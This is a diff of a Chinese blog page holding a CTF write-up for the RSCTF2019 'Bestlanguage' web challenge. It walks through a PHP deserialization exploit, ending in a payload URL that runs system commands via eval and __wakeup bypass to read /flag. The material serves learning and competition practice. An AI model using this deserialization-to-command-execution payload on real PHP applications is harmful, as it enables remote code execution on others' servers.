class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'string'</span>]);</span><br></pre></td></tr></table></figure>
+<h1 id="Bestlanguage"><a href="#Bestlanguage" class="headerlink" title="Bestlanguage"></a>Bestlanguage</h1><p>访问题目地址:<a target="_blank" rel="noopener" href="http://117.139.247.14:9531/">http://117.139.247.14:9531</a> 可见直接给源码，观察,涉及到反序列化利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yemoli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$alive</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive = <span class="keyword">new</span> good();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">good</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I am a good boy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bad</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
 <p>涉及到3个类，good没什么用，因为反序列化时候不会执行__con struct()方法。</p>
-<p>发现yemoli这个class他的$alive变量是可控的，以为可以直接控制，后来发现这是个protected的变量，所以利用<a href="https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，">https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，</a></p>
+<p>发现yemoli这个class他的$alive变量是可控的，以为可以直接控制，后来发现这是个protected的变量，所以利用<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，">https://www.freebuf.com/column/182293.html里提到的方法，先创建一个yemoli的子类，</a></p>
 <p>代码如下: </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">yemoli</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $wc;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;wc = <span class="keyword">new</span> yemoli();</span><br><span class="line"><span class="keyword">$this</span>-&gt;wc-&gt;alive = <span class="keyword">new</span> bad();</span><br><span class="line"><span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;wc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> ChildClass();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;make();</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">yemoli</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$wc</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;wc = <span class="keyword">new</span> yemoli();</span><br><span class="line"><span class="keyword">$this</span>-&gt;wc-&gt;alive = <span class="keyword">new</span> bad();</span><br><span class="line"><span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;wc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ChildClass();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;make();</span><br></pre></td></tr></table></figure>
 
 <p>即可成功覆盖$alive</p>
 <p>同时修改bad类，为code提供默认值，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bad</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $code = <span class="string">"eval(system($_G1ET[p]));"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bad</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&quot;eval(system(<span class="subst">$_G1ET</span>[p]));&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里就成功的生成了序列化字符串</p>
-<p><code>O:6:&quot;yemoli&quot;:1:s:8:&quot;*alive&quot;;O:3:&quot;bad&quot;:1:s:9:&quot;badcode&quot;;s:23:&quot;eval(system($_GET[p]));&quot;;}}</code></p>
+<p><code>O:6:&quot;yemoli&quot;:1:s:8:&quot;*alive&quot;;O:3:&quot;bad&quot;:1:s:9:&quot;badcode&quot;;s:23:&quot;eval(system($_GET[p]));&quot;;&#125;&#125;</code></p>
 <!--复现时，如果报500错误，可以将$_GET[p]删除，序列化之后再补充，不知道为什么加了$_GET[p]之后就会500，别忘了改一下大小-->
 
-<p>然后发现代码并没有成功执行，这个卡了很长时间，<br>抱着试一试看的态度去夜师傅的blog看了一下，有一篇文章<a href="https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/">https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/</a><br>里面写道对于private和protected，php在序列化的时候会自动补上不可见的字符，我们这里用%00即可替代，同时这篇文章还提到了一个cve漏洞，可以修改yemoli这个object对象的大小来跳过执行__wakeup()这个魔法函数。</p>
+<p>然后发现代码并没有成功执行，这个卡了很长时间，<br>抱着试一试看的态度去夜师傅的blog看了一下，有一篇文章<a target="_blank" rel="noopener" href="https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/">https://yml-sec.top/2019/07/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9/</a><br>里面写道对于private和protected，php在序列化的时候会自动补上不可见的字符，我们这里用%00即可替代，同时这篇文章还提到了一个cve漏洞，可以修改yemoli这个object对象的大小来跳过执行__wakeup()这个魔法函数。</p>
 <p>替代后发现凡是涉及到单引号都会导致题目服务器报500错误，所以迂回，采用get传参<br>最终payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.139.247.14:9531/index.php?p=cat%20%2Fflag&amp;string=O:6:%22yemoli%22:2:&#123;s:8:%22%00*%00alive%22;O:3:%22bad%22:1:&#123;s:9:%22%00bad%00code%22;s:23:%22eval(system($_GET[p]));%22;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.139.247.14:9531/index.php?p=cat%20%2Fflag&amp;string=O:6:%22yemoli%22:2:&#123;s:8:%22%00*%00alive%22;O:3:%22bad%22:1:&#123;s:9:%22%00bad%00code%22;s:23:%22eval(system($_GET[p]));%22;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功getflag</p>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
-          
-            <a href="/tags/web/" rel="tag"># web</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/11/03/RSCTF2019-MISC.html" rel="next" title="RSCTF2019_MISC">
-                <i class="fa fa-chevron-left"></i> RSCTF2019_MISC
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/03/RSCTF2019-PWN.html" rel="prev" title="RSCTF2019_PWN">
-                RSCTF2019_PWN <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-    <div class="comments" id="comments">
-    </div>
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg"
-                alt="Jesen" />
-            
-              <p class="site-author-name" itemprop="name">Jesen</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/#%7C%7C%20archive">
-              
-                  <span class="site-state-item-count">17</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">18</span>
-                  <span class="site-state-item-name">标签</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/mrjesen" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="/#暂不公开" target="_blank" title="Telegram">
-                      
-                        <i class="fa fa-fw fa-github"></i>Telegram</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://www.zhihu.com/people/xlv5/#" target="_blank" title="知乎">
-                      
-                        <i class="fa fa-fw fa-compass"></i>知乎</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="/#" target="_blank" title="微博">
-                      
-                        <i class="fa fa-fw fa-weibo"></i>微博</a>
-                  </span>
-                
-            </div>
-          
-
-          
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                友情链接
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.bugku.com" title="Bugku" target="_blank">Bugku</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://yml-sec.top/" title="yemoli" target="_blank">yemoli</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.194nb.com/" title="Aman" target="_blank">Aman</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Getshell"><span class="nav-number">1.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EzCode"><span class="nav-number">2.</span> <span class="nav-text">EzCode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bestlanguage"><span class="nav-number">3.</span> <span class="nav-text">Bestlanguage</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Jesen</span>
-
-  
-</div>
-
-
-
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Jesen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://jesen.ddwhm.com/2019/11/03/RSCTF2019-WEB.html">http://jesen.ddwhm.com/2019/11/03/RSCTF2019-WEB.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/11/03/RSCTF2019-PWN.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">RSCTF2019_PWN</div></div></a></div><div class="next-post pull-right"><a href="/2019/11/03/RSCTF2019-MISC.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">RSCTF2019_MISC</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2019/11/11/zongjie.html" title="个人打CTF的一些总结"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-11</div><div class="title">个人打CTF的一些总结</div></div></a></div><div><a href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-17</div><div class="title">2021年东北赛区ciscn分区赛wp</div></div></a></div><div><a href="/2019/11/09/hxbctf-2019.html" title="湖湘杯2019 web1-UNTAR writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-09</div><div class="title">湖湘杯2019 web1-UNTAR writeup</div></div></a></div><div><a href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-27</div><div class="title">纵横杯2020-WRITEUP</div></div></a></div><div><a href="/2020/08/24/qwb2020.html" title="强网杯2020部分writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-24</div><div class="title">强网杯2020部分writeup</div></div></a></div><div><a href="/2020/08/24/ciscncs.html" title="CISCN2020 初赛WEB writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-24</div><div class="title">CISCN2020 初赛WEB writeup</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="avatar"/><div class="author-info__name">Jesen</div><div class="author-info__description">想要人前装逼,必须得在人后学习</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/mrjesen" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">欢迎访问Jesen的博客。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Getshell"><span class="toc-number">1.</span> <span class="toc-text">Getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EzCode"><span class="toc-number">2.</span> <span class="toc-text">EzCode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bestlanguage"><span class="toc-number">3.</span> <span class="toc-text">Bestlanguage</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="2021年东北赛区ciscn分区赛wp"/></a><div class="content"><a class="title" href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp">2021年东北赛区ciscn分区赛wp</a><time datetime="2021-06-17T13:43:36.000Z" title="Created 2021-06-17 21:43:36">2021-06-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="纵横杯2020-WRITEUP"/></a><div class="content"><a class="title" href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP">纵横杯2020-WRITEUP</a><time datetime="2020-12-27T12:58:25.000Z" title="Created 2020-12-27 20:58:25">2020-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/16/RSCTF2020writeup.html" title="RSCTF2020_writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="RSCTF2020_writeup"/></a><div class="content"><a class="title" href="/2020/11/16/RSCTF2020writeup.html" title="RSCTF2020_writeup">RSCTF2020_writeup</a><time datetime="2020-11-16T03:30:17.000Z" title="Created 2020-11-16 11:30:17">2020-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/08/24/qwb2020.html" title="强网杯2020部分writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="强网杯2020部分writeup"/></a><div class="content"><a class="title" href="/2020/08/24/qwb2020.html" title="强网杯2020部分writeup">强网杯2020部分writeup</a><time datetime="2020-08-24T07:59:01.000Z" title="Created 2020-08-24 15:59:01">2020-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/08/24/ciscncs.html" title="CISCN2020 初赛WEB writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="CISCN2020 初赛WEB writeup"/></a><div class="content"><a class="title" href="/2020/08/24/ciscncs.html" title="CISCN2020 初赛WEB writeup">CISCN2020 初赛WEB writeup</a><time datetime="2020-08-24T02:37:46.000Z" title="Created 2020-08-24 10:37:46">2020-08-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Jesen</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/utils.js"></script><script src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Just Go Go',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: true
+    }, null))
   }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/fastclick/1.0.6/fastclick.min.js"></script>
-  
-
-  
-  
